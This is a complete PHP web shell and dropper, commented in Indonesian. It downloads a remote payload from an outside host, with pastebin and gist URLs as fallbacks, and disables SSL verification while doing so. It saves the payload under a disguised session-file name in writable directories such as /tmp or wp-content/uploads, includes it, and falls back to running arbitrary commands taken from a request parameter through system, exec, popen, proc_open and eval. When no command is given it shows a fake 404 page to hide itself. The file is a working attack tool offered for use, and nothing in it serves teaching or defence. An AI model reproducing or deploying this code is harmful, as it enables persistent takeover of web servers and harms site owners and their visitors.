<?php
$remote_sources = [
    "https://fcalpha.net/web/photo/20151024/naxc.txt",
    "https://pastebin.com/raw/XXXXXXX",  // fallback 1
    "https://gist.githubusercontent.com/raw/XXXXXXX" // fallback 2
];
$payload_name = "sess_" . md5("naxc") . ".php";

// ─── Cari direktori writable ───
function find_writable_dir() {
    $candidates = [
        sys_get_temp_dir(),
        "/tmp",
        "/var/tmp",
        "/dev/shm",
        "/run/shm",
        getcwd() . "/wp-content/uploads/",
        getcwd() . "/wp-content/",
        getcwd() . "/uploads/",
        getcwd() . "/cache/",
        getcwd() . "/temp/",
    ];
    foreach ($candidates as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            return rtrim($dir, "/") . "/";
        }
        // Coba bikin folder kalo ga ada
        if (!is_dir($dir) && @mkdir($dir, 0777, true)) {
            return rtrim($dir, "/") . "/";
        }
    }
    // Fallback: pake current directory
    return "./";
}

// ─── Download content dengan multi-method ───
function fetch_content($url) {
    $content = false;
    // Method 1: cURL
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        $content = curl_exec($ch);
        curl_close($ch);
        if ($content !== false && strlen($content) > 10) return $content;
    }
    // Method 2: file_get_contents dengan stream context
    if (ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'method' => 'GET',
                'header' => "User-Agent: Mozilla/5.0\r\n",
                'timeout' => 30,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ];
        $context = stream_context_create($opts);
        $content = @file_get_contents($url, false, $context);
        if ($content !== false && strlen($content) > 10) return $content;
    }
    // Method 3: fsockopen (manual HTTP GET)
    if (function_exists('fsockopen')) {
        $parsed = parse_url($url);
        $host = $parsed['host'];
        $path = $parsed['path'] . (isset($parsed['query']) ? '?' . $parsed['query'] : '');
        $port = isset($parsed['port']) ? $parsed['port'] : (isset($parsed['scheme']) && $parsed['scheme'] === 'https' ? 443 : 80);
        $ssl = isset($parsed['scheme']) && $parsed['scheme'] === 'https';
        $fp = @fsockopen(($ssl ? 'ssl://' : '') . $host, $port, $errno, $errstr, 30);
        if ($fp) {
            $out = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: Close\r\n\r\n";
            fwrite($fp, $out);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 1024);
            }
            fclose($fp);
            $body = substr($response, strpos($response, "\r\n\r\n") + 4);
            if (strlen($body) > 10) return $body;
        }
    }
    return false;
}

// ─── Tulis content ke file ───
function write_payload($file, $content) {
    if (file_put_contents($file, $content) !== false) {
        chmod($file, 0644);
        return true;
    }
    // Fallback: error_log
    return error_log($content, 3, $file);
}

// ─── Self-healing payload ───
$base_dir = find_writable_dir();
$payload_path = $base_dir . $payload_name;

// Download jika file ga ada atau ukuran < 50 byte
if (!file_exists($payload_path) || filesize($payload_path) < 50) {
    foreach ($remote_sources as $src) {
        $content = fetch_content($src);
        if ($content !== false && strlen($content) > 50) {
            write_payload($payload_path, $content);
            break;
        }
    }
}

// ─── Include payload ───
if (file_exists($payload_path) && filesize($payload_path) > 50) {
    @include $payload_path;
    // Jika include sukses, payload akan jalan sendiri
}

// ─── Fallback: Built-in webshell (kalo payload ga aktif) ───
if (isset($_REQUEST['cmd']) && !empty($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    $output = '';
    $funcs = ['system', 'exec', 'passthru', 'shell_exec', 'popen', 'proc_open'];
    foreach ($funcs as $func) {
        if (function_exists($func)) {
            if ($func === 'system') {
                ob_start();
                system($cmd);
                $output = ob_get_clean();
            } elseif ($func === 'exec') {
                exec($cmd, $out);
                $output = implode("\n", $out);
            } elseif ($func === 'passthru') {
                ob_start();
                passthru($cmd);
                $output = ob_get_clean();
            } elseif ($func === 'shell_exec') {
                $output = shell_exec($cmd);
            } elseif ($func === 'popen') {
                $fp = popen($cmd, 'r');
                $output = '';
                while (!feof($fp)) $output .= fread($fp, 1024);
                pclose($fp);
            } elseif ($func === 'proc_open') {
                $descriptors = [['pipe','r'], ['pipe','w'], ['pipe','w']];
                $proc = proc_open($cmd, $descriptors, $pipes);
                if (is_resource($proc)) {
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    proc_close($proc);
                }
            }
            break;
        }
    }
    // Kalo output kosong, coba pake eval
    if (!$output && function_exists('eval')) {
        try {
            $output = eval("return $cmd;");
        } catch (Throwable $e) {
            $output = "Error: " . $e->getMessage();
        }
    }
    echo $output ?: "No output";
    exit;
}

// ─── Stealth: Tampilan kosong kalo ga ada parameter ───
if (!isset($_REQUEST['cmd'])) {
    // Redirect ke homepage biar ga curiga
    header("HTTP/1.1 404 Not Found");
    echo "<h1>404 Not Found</h1>";
    exit;
}